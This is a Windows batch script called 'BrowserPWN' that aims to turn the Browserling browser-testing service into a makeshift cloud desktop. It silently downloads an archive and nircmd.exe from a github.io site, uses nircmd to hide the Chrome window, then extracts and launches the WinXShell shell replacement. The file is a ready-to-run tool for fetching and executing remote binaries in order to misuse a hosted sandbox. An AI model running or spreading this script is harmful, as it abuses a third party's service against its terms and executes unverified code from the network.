@echo off
color 1f
echo ===================== [BrowserPWN] =====================
echo ^| Turn Browserling into a Cloud PC service with ease!  ^|
echo ========================================================
cd /d "%userprofile%"
echo Downloading WinXShell...
curl https://bfffggh.github.io/bp1/WinXShell_x64.7z -o wx.7z 2>NUL
echo Initializing session...
curl https://bfffggh.github.io/bp1/nircmd.exe -o nc.exe 2>NUL
nc win hide class Chrome_WidgetWin_1
del nc.exe
"%ProgramFiles%\7-zip\7z.exe" x wx.7z -owx >NUL
del wx.7z
start "" wx\winxshell\winxshell.exe
